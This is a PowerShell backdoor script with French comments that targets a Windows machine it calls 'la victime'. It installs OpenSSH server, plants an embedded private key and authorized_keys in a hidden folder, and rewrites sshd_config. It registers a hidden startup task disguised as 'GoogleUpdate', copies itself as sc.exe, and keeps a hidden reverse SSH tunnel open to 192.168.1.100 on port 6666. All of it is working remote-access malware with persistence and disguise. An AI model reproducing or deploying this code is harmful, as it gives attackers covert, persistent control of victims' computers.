$InformationPreference = 'SilentlyContinue'
$ConfirmPreference = 'None'
$ErrorActionPreference = 'Stop'
$VerbosePreference = 'Continue'
################################################################################################################################################################################
<#
.SYNOPSIS
installPwsh7 

.DESCRIPTION
install powershell 7.3.7 a partir du github.
Fait en sorte que 'pwsh' soit utilsable comme variable d'environnement
#>

function installPwsh7
{
    $pwshPath = "C:\progra~1\powershell\7\pwsh.exe"
    while(!(Test-Path -Path "$pwshPath"))
    {
        Invoke-RestMethod -Uri "https://github.com/PowerShell/PowerShell/releases/download/v7.4.1/PowerShell-7.4.1-win-x64.msi" -Method Get -OutFile "$env:TEMP\ps7.msi"
        msiexec.exe /i "$env:TEMP\ps7.msi" /quiet
        Start-Sleep 20
    }
    if (!(Get-Command pwsh))
    {
        Set-item -Path Env:\Path -Value ($env:Path + "C:\progra~1\powershell\7\;") -Force
    }
}
################################################################################################################################################################################
<#
.SYNOPSIS
installSshd 

.DESCRIPTION
install le service SSHD

.NOTES
Configure le démarrage automatique du service
Démarre le service
#>

function installSshd 
{   
    $status_install = Get-WindowsCapability -Online -Name "OpenSSH.Server~~~~0.0.1.0"
    $status_install = $status_install.State

    if ($status_install -match "NotPresent")
    {
        Add-WindowsCapability -Online -Name "OpenSSH.Server~~~~0.0.1.0"
        Start-Service -Name sshd -Confirm:$false
        Set-Service -Name sshd -StartupType Automatic
    }  
    if ($status_install -match "Installed")
    {
        if (!(Test-Path -Path "C:\Windows\System32\OpenSSH\sshd.exe") -or !(Test-Path -Path "C:\Windows\System32\OpenSSH\ssh.exe")) 
        {
            Write-Debug "service ssh(d) not correct"
            Write-Debug "removing ssh(d)..."
            Remove-WindowsCapability -Name "OpenSSH.Server~~~~0.0.1.0" -Online
            Remove-WindowsCapability -Name "OpenSSH.Client~~~~0.0.1.0" -Online
            Write-Debug "install ssh(d) in progress..."
            Add-WindowsCapability -Online -Name "OpenSSH.Server~~~~0.0.1.0"
            Add-WindowsCapability -Online -Name "OpenSSH.Client~~~~0.0.1.0"
            Set-Service -Name sshd -StartupType Automatic -Force
            Write-Debug "set SSHD startup automatic"
        }
        $status_lanch = Get-Service -Name sshd
        $status_lanch = $status_lanch.Status
        if ($status_lanch -notmatch "Running")
        {
            Start-Service -Name sshd -Confirm:$false
        } else {Write-Debug "service SSHD is already start"}
    }
}
################################################################################################################################################################################
<#
.SYNOPSIS
createKey1OnRemote

.DESCRIPTION
créer le fichier de clé privée (key1) sur la victime puis configure ses ACL

.NOTES
Avant d'ajouter ACL, l'héritage est désactivé pour suppr toutes les ACLs
Acl sur le fichier : 
Full Control pour l'utilisateur actuellement connecté +  Full Control pour SYSTEM
#>

function createKey1OnRemote 
{
    #Creation privateKey1 sur pc distant avec utf8
    New-Item -ItemType File -Path "$Global:contentDirectory/key1" -Value $privateKey1 -Force
    $currentUser = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name

    #Droit de la key uniquement pour l'utilisateur connecté
    $directory = "$Global:contentDirectory/key1"
    $acl = Get-Acl $directory
    $acl.SetAccessRuleProtection($true,$false)
    $AccessRule = New-Object System.Security.AccessControl.FileSystemAccessRule("$currentUser","FullControl","Allow")
    $acl.SetAccessRule($AccessRule)
    $acl |Set-Acl
}
################################################################################################################################################################################
<#
.SYNOPSIS
createAuthorized_key

.DESCRIPTION
créer le fichier (authorized_keys) et (administrators_authorized_keys) sur la victime dans $env:LOCALAPPDATA/content puis ajoute les ACL 
+ Ajoute la pubKey1 dans celui-ci
.NOTES
Avant d'ajouter ACL, l'héritage est désactivé pour suppr toutes les ACLs
Acl sur le fichier : 
Full Control pour l'utilisateur actuellement connecté + Full Control pour SYSTEM
#>

function createAuthorized_key
{
    $authorized_keys = "$Global:contentDirectory/authorized_keys"
    $administrators_authorized_keys = "$Global:contentDirectory/administrators_authorized_keys"
    $authorized_keys,$administrators_authorized_keys | ForEach-Object {
        New-Item -ItemType File -Path $_ -Value $pubKey1 -Force
        $pubKey1 | Out-File $_ -Encoding utf8 -Force 

        #ajout des droit neccessaire pour le fonctionnement
        $currentUser = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
        $acl = Get-Acl $_
        $acl.SetAccessRuleProtection($true,$false)
        $AccessRule = New-Object System.Security.AccessControl.FileSystemAccessRule("$currentUser","FullControl","Allow")
        $systemRule = New-Object System.Security.AccessControl.FileSystemAccessRule("SYSTEM","FullControl","Allow")
        $acl.SetAccessRule($AccessRule)
        $acl.SetAccessRule($systemRule)
        $acl |Set-Acl
    }
}
################################################################################################################################################################################
<#
.SYNOPSIS
configSshd_config 

.DESCRIPTION
creer et configure le fichier de conf pour le service sshd

.NOTES
ajoute ceci :
Subsystem powershell c:/progra~1/powershell/7/pwsh.exe -sshs -NoLogo
PubkeyAuthentication yes
PasswordAuthentication no
#>

Function configSSHD_config
{ 
    $a = @"   
AuthorizedKeysFile	$Global:contentDirectory/authorized_keys
PasswordAuthentication no
Subsystem	sftp	sftp-server.exe
Subsystem powershell c:/progra~1/powershell/7/pwsh.exe -sshs -NoLogo
Match Group administrators
AuthorizedKeysFile $Global:contentDirectory/administrators_authorized_keys"
"@
    #ajout autorisation de mofifier fichier
    $pathConfigSSHD = "C:\ProgramData\ssh\sshd_config"
    New-Item -ItemType File -Path $pathConfigSSHD -Value $a -Force
}
################################################################################################################################################################################
<#
.SYNOPSIS
createKey2 

.DESCRIPTION
creer la key 2 du client si elle n'existe pas
+ puis se connecte au serveur pour ajouter celle-ci dans authorized_keys

.NOTES
#>
function createKey2OnRemote
{
    if (!(Test-Path $Global:contentDirectory\key2))#si key 2 n'est pas crée
    {
        ssh-keygen -t rsa -b 4096 -N '' -f "$Global:contentDirectory\key2"
        cat $Global:contentDirectory\key2.pub | ssh remote-ssh-client@192.168.1.100 -o StrictHostKeyChecking=no -i "$Global:contentDirectory\key1" 'cat >> ~/.ssh/authorized_keys2'
    } 
}
################################################################################################################################################################################
<#
.SYNOPSIS
task

.DESCRIPTION
creer la tache pour lancer le programme au demarrage

.NOTES
#>
function task
{
    $currentUser = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
    $settings = New-ScheduledTaskSettingsSet -Hidden
    $trigger = New-ScheduledTaskTrigger -AtStartup
    $principal = New-ScheduledTaskPrincipal -UserId "$currentUser" -RunLevel Highest
    $actions = New-ScheduledTaskAction -Execute powershell -Argument '-WindowStyle Hidden -F "%localappdata%\content\sc.exe"'
    $task = New-ScheduledTask -Action $actions -Principal $principal -Trigger $trigger -Settings $settings

    Register-ScheduledTask 'GoogleUpdate{b54165-e515-b163-o14654-u4524}' -InputObject $task -User "$currentUser" -Force
}
################################################################################################################################################################################
<#
.SYNOPSIS
copyExeOnDevice 

.DESCRIPTION
utilise l'id du process pour copier l'EXE dans $Global:contentDirectory

.NOTES
#>
function copyExeOnDevice 
{
    $pathCurrentFile = (Get-Process -PID $PID).Path
    Copy-Item $pathCurrentFile $Global:contentDirectory\sc.exe    
}
################################################################################################################################################################################
$privateKey1 = '-----BEGIN OPENSSH PRIVATE KEY-----
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
3LkjjjQys4MAAAAHZGVmYXVsdAECAwQ=
-----END OPENSSH PRIVATE KEY-----
'
################################################################################################################################################################################
$pubKey1 = @"
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQDVy7dLxPb45rQaNipcwoRdfLgWDe+peHcFlupD5hunr4VH7pmttKrPY7JY9tdz2JBy8+3IwOXQ7wZWzsWVCSzHY5IkLE24h8W5pezadI8Y6bCs8KQVHIiqWQdl45yfstXGzfWICloSuy4sUBjTF7mr/foLxCikxPpThmEdzDkaBxJt+JX2Gdm0VaMsL7GKzwI2Wh34mpv2h3OgDZ/XDRs6Ombd+knNe8Lw5iiWp0gxPS1gj260HqGF/FNi+K5udIp7IzwcbI4Fg/x7AdlrkVSuPQqUeMCY+XGXVbyPgXozJ2hFJE0kCj72yEyJABuFkdvXR7dfjQdIc2xuOWqrKtuNGmITqedqulyjc58KVceEEiSgAjK38/fQlGmV9wHsKWeWFLuNLNci3yP6vpTXYnV8WdAwa4ksJtFYb06+DmB56HCazziKYurXq9tmTkjDrtazd4fkJdbIdliTnm9rL+p57TE2L8x3Em6s/plcy6nMMsaJzzdNvT3Kfhk9SP2JA3ojddokRIhPTcivXRcR9ffebqQN17TNawHOjmPNDkImjRXkRaNnQdBL6wAD5cQ1KHfnPq+kCGdANjqW3nWcXkENaxHnCjlLCxGv/YQZvmJ8HR7kbAg5xa98EfLzi4ZkiADM2APOr6szLV7zECLCFnsS/TF/GW7U9Q4V8XTJkMZTvQ== default
"@
################################################################################################################################################################################


try 
{
    installPwsh7
}
catch 
{
    Write-Error $_
}

try 
{
    installSshd
}
catch 
{
    Write-Error $_
}

$Global:contentDirectory = "$env:LOCALAPPDATA/content"

try 
{
    createKey1OnRemote
    createAuthorized_key
    configSSHD_config
    createKey2OnRemote
    task
}
catch 
{
    Write-Error $_
}
try 
{
    copyExeOnDevice
}
catch 
{
    Write-Error $_
}

Restart-Service -Name sshd -Force
Remove-Item -Path $Global:contentDirectory\key1 -Force 
Remove-Item -Path "$env:USERPROFILE/.ssh/known_hosts" -Force -ErrorAction Ignore
$arg = $ExecutionContext.InvokeCommand.ExpandString('-c "while(1){ `
    ssh remote-ssh-client@192.168.1.100 -o StrictHostKeyChecking=no -i $Global:contentDirectory\key2 -N -p 22 -R 6666:localhost:22; `
    sleep 30 `
}"')
Start-Process -WindowStyle hidden -FilePath powershell -ArgumentList $arg
#ssh remote-ssh-client@172.19.125.245 -o StrictHostKeyChecking=no -i "$Global:contentDirectory\key2" -p 22 -R 6666:localhost:22
#Invoke-PS2EXE C:\Users\gunsa\Desktop\Sc_Powershell\FullAccesDOOR\mainAll.ps1 C:\Users\gunsa\ExercicesPS\sc.exe